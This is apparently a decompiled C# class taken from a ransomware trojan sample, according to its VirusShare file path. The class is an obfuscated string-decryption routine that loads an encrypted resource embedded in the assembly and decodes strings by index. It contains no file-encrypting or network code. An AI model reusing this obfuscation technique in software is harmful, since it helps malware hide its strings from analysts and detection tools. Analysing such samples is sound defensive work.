// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BitGenerator, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=70e4c26ef2031892
// MVID: D3922F89-E00A-4D10-8BC9-9309D5539F14
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.Win32.Scar.nxii-31823040d8ccb20eab0b8653d01af370a6537017e69ead69f6f7b73d6ef7ac14.exe

using \u0012;
using \u0014;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0012
{
  internal sealed class \u001C
  {
    private static readonly string \u0001;
    private static readonly string \u0002;
    private static readonly byte[] \u0001;
    private static readonly Dictionary<int, string> \u0001;
    private static readonly bool \u0001;
    private static readonly int \u0001;

    public static string \u0001([In] int obj0)
    {
      if (true)
        goto label_17;
label_2:
      string str1;
      \u001C.\u0001.TryGetValue(obj0, out str1);
      switch (str1)
      {
        case null:
          break;
        default:
          return str1;
      }
label_3:
      int num1 = obj0;
      if (true)
      {
        byte[] numArray1 = \u001C.\u0001;
        int index1 = num1;
        int num2 = index1 + 1;
        int num3 = (int) numArray1[index1];
        int num4;
        if ((num3 & 128) == 0)
        {
          num4 = num3;
          if (num4 == 0)
            goto label_6;
        }
        else if ((num3 & 64) == 0)
        {
          num4 = ((num3 & 63) << 8) + (int) \u001C.\u0001[num2++];
        }
        else
        {
          int num5 = (num3 & 31) << 24;
          byte[] numArray2 = \u001C.\u0001;
          int index2 = num2;
          int num6 = index2 + 1;
          int num7 = (int) numArray2[index2] << 16;
          int num8 = num5 + num7;
          byte[] numArray3 = \u001C.\u0001;
          int index3 = num6;
          int num9 = index3 + 1;
          int num10 = (int) numArray3[index3] << 8;
          int num11 = num8 + num10;
          byte[] numArray4 = \u001C.\u0001;
          int index4 = num9;
          num2 = index4 + 1;
          int num12 = (int) numArray4[index4];
          num4 = num11 + num12;
        }
        string str2;
        try
        {
          byte[] numArray5 = \u0003\u0002.\u0083\u0004(\u0017\u0006.\u007E\u0016\u000F((object) \u008C.\u008E\u0003(), \u001C.\u0001, num2, num4));
          string str3 = \u001B.\u0007\u0003(\u0017\u0006.\u007E\u0016\u000F((object) \u008C.\u008E\u0003(), numArray5, 0, numArray5.Length));
          if (\u001C.\u0001)
          {
            try
            {
              \u001C.\u0001.Add(obj0, str3);
            }
            catch
            {
            }
          }
          str2 = str3;
        }
        catch
        {
          if (true)
            str2 = (string) null;
        }
        return str2;
      }
label_6:
      return string.Empty;
label_17:
      int num13 = obj0 - \u001C.\u0001;
      if (true)
        goto label_18;
label_1:
      if (!\u001C.\u0001)
        goto label_3;
      else
        goto label_2;
label_18:
      obj0 = num13;
      goto label_1;
    }

    static \u001C()
    {
      do
      {
        \u001C.\u0001 = "1";
        \u001C.\u0002 = "204";
        \u001C.\u0001 = (byte[]) null;
        \u001C.\u0001 = false;
        \u001C.\u0001 = 0;
        if (!\u0007\u0002.\u008C\u0004(\u001C.\u0001, "1"))
          goto label_3;
      }
      while (false);
      \u001C.\u0001 = true;
      \u001C.\u0001 = new Dictionary<int, string>();
label_3:
      \u001C.\u0001 = \u0018\u0006.\u0017\u000F(\u001C.\u0002);
      Assembly assembly = \u0013.\u008B\u0002();
      Stream stream = \u009B\u0003.\u007E\u008D\u0007((object) assembly, "{004647fe-9999-4f2a-ad87-51d89c929784}");
      try
      {
        if (true)
        {
          int length = \u0019\u0006.\u0018\u000F(\u0098\u0004.\u007E\u0092\u0008((object) stream));
          byte[] numArray;
          do
          {
            numArray = new byte[length];
          }
          while (false);
          if (true)
          {
            int num = \u0008\u0004.\u007E\u009C\u0007((object) stream, numArray, 0, length);
            \u001C.\u0001 = \u0006.\u0001(numArray);
          }
        }
        \u0011.\u007E\u001D\u0002((object) stream);
      }
      finally
      {
        if (stream != null)
          \u0011.\u007E\u0007\u0002((object) stream);
      }
    }
  }
}
